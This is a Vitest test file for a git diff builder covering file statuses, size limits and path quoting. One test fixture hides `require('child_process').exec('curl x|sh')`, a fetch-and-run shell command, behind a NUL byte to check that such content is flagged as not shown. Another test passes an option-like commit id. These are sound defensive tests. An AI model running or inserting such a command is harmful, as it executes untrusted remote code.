import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { createGit, type DiffEntry, type Git } from "../../kernel/git/index.js";
import { createProcessRunner, type ProcessRunner } from "../../kernel/process/index.js";
import { DIFF_LIMITS, ItemDiffSchema } from "../../kernel/schemas/index.js";
import { buildDiff, gitQuoted, treeDiff } from "./diff.js";
import { stageItem } from "./commit.js";

const SLOW = { timeout: 30_000 };

let root: string;
let repo: string;
let runner: ProcessRunner;
let git: Git;

async function plain(...args: string[]): Promise<string> {
  const out: string[] = [];
  const result = await runner.run({ command: { argv: ["git", "-c", "commit.gpgsign=false", ...args] }, cwd: repo, env: { GIT_CONFIG_NOSYSTEM: "1" }, stdout: { onLine: (line) => out.push(line) } });
  if (result.kind !== "finished" || result.exitCode !== 0) throw new Error(`git ${args.join(" ")} failed`);
  return out.join("\n");
}

const write = (path: string, text: string | Buffer) => writeFileSync(join(repo, path), text);

async function changeFrom(base: string) {
  const tree = await stageItem(git, repo);
  if (!tree.ok) throw new Error(tree.error.message);
  const diff = await treeDiff(git, repo, base, tree.value);
  if (!diff.ok) throw new Error(diff.error.message);
  // The reply would pass the API schema.
  ItemDiffSchema.parse({ ...diff.value, worktree: { repoId: "orders-api", dir: ".tokama/wt/x", branch: "tokama/x", baseCommit: base } });
  return diff.value;
}

beforeEach(async () => {
  root = realpathSync(mkdtempSync(join(tmpdir(), "tokama-diff-")));
  repo = join(root, "repo");
  const home = join(root, "home");
  mkdirSync(repo);
  mkdirSync(home);
  runner = createProcessRunner({ parentEnv: { PATH: process.env["PATH"], HOME: home } });
  git = createGit({ runner });
  await plain("init", "-q", "-b", "main");
  await plain("config", "user.name", "Test");
  await plain("config", "user.email", "test@example.com");
}, SLOW.timeout);
afterEach(() => rmSync(root, { recursive: true, force: true }));

async function seed(files: Record<string, string | Buffer>): Promise<string> {
  for (const [path, text] of Object.entries(files)) write(path, text);
  await plain("add", "-A");
  await plain("commit", "-q", "-m", "seed");
  return plain("rev-parse", "HEAD");
}

describe("treeDiff on a real repo", () => {
  it("lists added, modified, deleted, renamed, binary and type-changed files with counts and their own hunks", SLOW, async () => {
    const base = await seed({
      "keep.txt": "one\ntwo\n",
      "gone.txt": "bye\n",
      "old.txt": "a\nb\nc\nd\ne\nf\ng\n",
      "bin.dat": Buffer.from([0, 1, 2]),
      link: "x\n",
      'q"x.txt': "q\n",
    });
    write("keep.txt", "one\nTWO\n");
    unlinkSync(join(repo, "gone.txt"));
    await plain("mv", "old.txt", "new.txt");
    write("new.txt", "a\nb\nc\nd\ne\nf\ng\nh\n");
    write("bin.dat", Buffer.from([0, 1, 3]));
    unlinkSync(join(repo, "link"));
    symlinkSync("keep.txt", join(repo, "link"));
    write('q"x.txt', "q\nr\n");
    mkdirSync(join(repo, "ü"));
    write("ü/é.txt", "u\n");
    const diff = await changeFrom(base);
    expect(diff.files.map((f) => [f.path, f.oldPath, f.status, f.added, f.removed, f.binary, f.cut])).toEqual([
      ["bin.dat", undefined, "modified", null, null, true, true],
      ["gone.txt", undefined, "deleted", 0, 1, false, false],
      ["keep.txt", undefined, "modified", 1, 1, false, false],
      ["link", undefined, "type_changed", 1, 1, false, false],
      ["new.txt", "old.txt", "renamed", 1, 0, false, false],
      ['q"x.txt', undefined, "modified", 1, 0, false, false],
      ["ü/é.txt", undefined, "added", 1, 0, false, false],
    ]);
    const hunks = (path: string) => diff.files.find((f) => f.path === path)!.hunks.flatMap((h) => h.lines);
    expect(hunks("bin.dat")).toEqual([]);
    expect(hunks("keep.txt")).toEqual([" one", "-two", "+TWO"]);
    // The two sections of a type change: the file removed, the link added.
    expect(hunks("link")).toEqual(["-x", "+keep.txt", "\\ No newline at end of file"]);
    expect(hunks("new.txt")).toContain("+h");
    expect(hunks('q"x.txt')).toEqual([" q", "+r"]);
    expect(hunks("ü/é.txt")).toEqual(["+u"]);
    // The binary file's content is not shown, so the diff says it is cut.
    expect(diff).toMatchObject({ moreFiles: 0, cut: true });
    expect(diff.files.filter((f) => f.cut).map((f) => f.path)).toEqual(["bin.dat"]);
  });

  it("marks a text file that git calls binary (a NUL byte) as cut, so its hidden content is never passed off as shown", SLOW, async () => {
    const base = await seed({ "app.js": "ok\n" });
    write("app.js", "// \u0000\nrequire('child_process').exec('curl x|sh')\n");
    const diff = await changeFrom(base);
    expect(diff.files).toMatchObject([{ path: "app.js", binary: true, added: null, removed: null, hunks: [], cut: true }]);
    expect(diff.cut).toBe(true);
  });

  it("reads the trees, not the worktree: a later edit does not show", SLOW, async () => {
    const base = await seed({ "a.txt": "a\n" });
    write("a.txt", "b\n");
    const tree = await stageItem(git, repo);
    if (!tree.ok) throw new Error(tree.error.message);
    write("a.txt", "c\n");
    const diff = await treeDiff(git, repo, base, tree.value);
    expect(diff.ok && diff.value.files[0]?.hunks[0]?.lines).toEqual(["-a", "+b"]);
  });

  it("keeps a huge change within the byte budget and marks what it leaves out", SLOW, async () => {
    const base = await seed({ "small.txt": "a\n" });
    // Under the line limit, but quotes and control bytes take more room as JSON than as text.
    write("big.txt", `${'"\u0001'.repeat(300)}\n`.repeat(900));
    write("small.txt", "b\n");
    const diff = await changeFrom(base);
    expect(Buffer.byteLength(JSON.stringify(diff))).toBeLessThan(DIFF_LIMITS.hunkBytes + DIFF_LIMITS.fileBytes + 1024);
    const big = diff.files.find((f) => f.path === "big.txt")!;
    expect(big).toMatchObject({ added: 900, removed: 0, cut: true });
    expect(big.hunks.length).toBeGreaterThan(0);
    expect(diff.cut).toBe(true);
    // Every changed file is still listed with its counts.
    expect(diff.files.map((f) => f.path)).toEqual(["big.txt", "small.txt"]);
  });

  it("lists a file over the line limit with its counts only", SLOW, async () => {
    const base = await seed({ "a.txt": "a\n" });
    write("lock.json", "x\n".repeat(DIFF_LIMITS.fileLines + 1));
    write("a.txt", "b\n");
    const diff = await changeFrom(base);
    expect(diff.files).toMatchObject([
      { path: "a.txt", hunks: [{ lines: ["-a", "+b"] }], cut: false },
      { path: "lock.json", added: DIFF_LIMITS.fileLines + 1, removed: 0, binary: false, hunks: [], cut: true },
    ]);
  });

  it("refuses ids that git would read as options", SLOW, async () => {
    const base = await seed({ "a.txt": "a\n" });
    expect(await treeDiff(git, repo, base, "--output=x")).toMatchObject({ ok: false });
  });
});

describe("buildDiff", () => {
  const entry = (path: string, extra: Partial<DiffEntry> = {}): DiffEntry => ({ status: "M", path, added: 1, removed: 1, ...extra });
  const section = (path: string, lines: string[]) => [`diff --git a/${path} b/${path}`, "index 1..2 100644", `--- a/${path}`, `+++ b/${path}`, "@@ -1 +1 @@", ...lines].join("\n");

  it("never shows a section under another file's name: on a mismatch the rest is listed without hunks", () => {
    const patch = [section("a.txt", ["-a", "+b"]), section("z.txt", ["-z", "+y"])].join("\n") + "\n";
    const diff = buildDiff([entry("a.txt"), entry("b.txt"), entry("z.txt")], { text: patch, cut: false });
    expect(diff.files.map((f) => [f.path, f.hunks.length, f.cut])).toEqual([
      ["a.txt", 1, false],
      ["b.txt", 0, true],
      ["z.txt", 0, true],
    ]);
    expect(diff.cut).toBe(true);
  });

  it("leaves out the section a capped read cut short", () => {
    const patch = section("a.txt", ["-a", "+b"]) + "\n" + section("b.txt", ["-a"]);
    const diff = buildDiff([entry("a.txt"), entry("b.txt")], { text: patch, cut: true });
    expect(diff.files.map((f) => [f.path, f.hunks.length, f.cut])).toEqual([
      ["a.txt", 1, false],
      ["b.txt", 0, true],
    ]);
  });

  it("cuts long lines and counts files past the limit", () => {
    const long = `+${"x".repeat(DIFF_LIMITS.lineChars + 50)}`;
    const one = buildDiff([entry("a.txt")], { text: `${section("a.txt", [long])}\n`, cut: false });
    expect(one.files[0]?.hunks[0]?.lines[0]).toHaveLength(DIFF_LIMITS.lineChars + 1);
    expect(one.files[0]?.hunks[0]?.lines[0]?.endsWith("…")).toBe(true);
    const many = Array.from({ length: DIFF_LIMITS.files + 3 }, (_, i) => entry(`f${i}.txt`, { added: 0, removed: 0 }));
    expect(buildDiff(many, { text: "", cut: false })).toMatchObject({ moreFiles: 3, cut: true });
  });

  it("quotes paths the way git writes them", () => {
    expect(gitQuoted("a/plain name.txt")).toBe("a/plain name.txt");
    expect(gitQuoted('a/q"x\\y')).toBe('"a/q\\"x\\\\y"');
    expect(gitQuoted("a/tab\there")).toBe('"a/tab\\there"');
    expect(gitQuoted("a/ü")).toBe('"a/\\303\\274"');
    expect(gitQuoted("a/\u0001")).toBe('"a/\\001"');
  });
});
